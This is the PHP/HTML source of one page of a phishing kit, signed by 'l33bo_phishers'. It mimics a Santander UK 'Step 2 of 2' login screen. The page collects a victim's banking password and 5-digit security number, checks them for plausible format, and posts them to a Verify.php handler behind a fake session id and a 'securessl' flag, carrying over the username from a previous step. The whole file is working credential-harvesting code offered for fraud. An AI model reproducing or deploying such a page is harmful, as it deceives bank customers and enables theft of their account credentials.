<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";
$_SESSION['user'] = $_POST['user'];
?>
<!DOCTYPE html>
<html lang="en-gb">
<head>
<title>Login</title>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="en-gb" http-equiv="content-language">
<meta content="width=device-width" name="viewport">
<link href="" media="handheld" rel="alternate">
<link href="assets/img/fav.ico" rel="shortcut icon">
<link href="assets/css/001.css" rel="stylesheet" type="text/css">
<style>
.error {
    margin: 0px;
    color: #db0000;
    font-size: 16px;
}
</style>
<script>
function Check() {
    var x = document.forms["login"]["pass"].value;
    if (x == null || x == "") {
        document.getElementById("ErrorPass0").style.display = "block";
        return false;
    }
	var passtest = /^(?=.*\d)(?=.*[a-zA-Z]).{8,12}$/;
	if(passtest.test(document.getElementById('pass').value) == false) {
		document.getElementById("ErrorPass0").style.display = "none";
        document.getElementById("ErrorPass1").style.display = "block";
        return false;
	}
    var x = document.forms["login"]["memo"].value;
    if (x == null || x == "") {
        document.getElementById("ErrorMemo0").style.display = "block";
        return false;
    }
	var memotest = /^[0-9]{5}$/;
	if(memotest.test(document.getElementById('memo').value) == false) {
		document.getElementById("ErrorMemo0").style.display = "none";
        document.getElementById("ErrorMemo1").style.display = "block";
        return false;
	}
}
</script>
</head>
<body>
<div id="outer">
<div id="banner">
<p id="userstatusNGB">
<img src="assets/img/logo.png">
</p>
<p class="cookiePolicy">
<img src="assets/img/ico_lockSmallWhite.png" height="30" width="26px">
</p>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<h1>Step 2 of 2: Password and Security number</h1>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="panel">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">                                                                           
<div class="panelInner">
<div class="inner">
<p class="sudoLabel">Please enter your password and security number below.</p>
<form id="login" name="login" method="post" action="Verify.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" enctype="application/x-www-form-urlencoded" onsubmit="return Check();">
<div class="formField"><label for="passcode">Password</label> <input autocomplete="off" class="wide" id="pass" maxlength="12" name="pass" type="password" value=''><div id="ErrorPass0" class="error" style="display:none"><p>Please enter your password</p></div><div id="ErrorPass1" class="error" style="display:none"><p>Your password should be 8-12 characters and contain atleast one number and one letter</p></div></div>
<div class="formField"><label for="regno">Security Number</label> <input autocomplete="off" class="wide" id="memo" maxlength="5" name="memo" type="tel" value=''><div id="ErrorMemo0" class="error" style="display:none"><p>Please enter your security number</p></div><div id="ErrorMemo1" class="error" style="display:none"><p>Your security number should be 5 digits</p></div></div>
<div class="clearer"></div>
</div>
<div class="divider">
<hr>
</div>
<div class="actions">
<input id="go" onclick="document.getElementById('memo').submit()" name="go" type="submit" value="Submit" class="submitAction">
<div class="nav">
<div class="lnkLev2">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="clearer"></div>
<div id="footerLogin">
<div class="FootNav">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" >Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" >Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" >Contact us</a></p>
</div>
</div>
</div>
<div class="appBannerBG">
<div class="appBannerLink">
<p style="text-align: center"><a href="#"><img alt="FSCS" src="./assets/img/001.png"></a></p>
</div>
</div>
<div class="clearer"></div>
<div>
<input name="smartAppForIosAndAndroid" type="hidden" value="true"> <input name="smartAppForIosAbvSix" type="hidden" value="true">
<div style="clear: both;text-align: center;padding-bottom:10px" class="footerLinksLogin">
<ul style="display: block;background-color: #D6D6D6;">
<li style="list-style: none;font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;font-size: 13px">Copyright &copy; Santander UK plc. All rights reserved</li>
</ul>
</div>
</div>
</div>
</div>
</body>
</html>
<?php
/*
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
*/
?>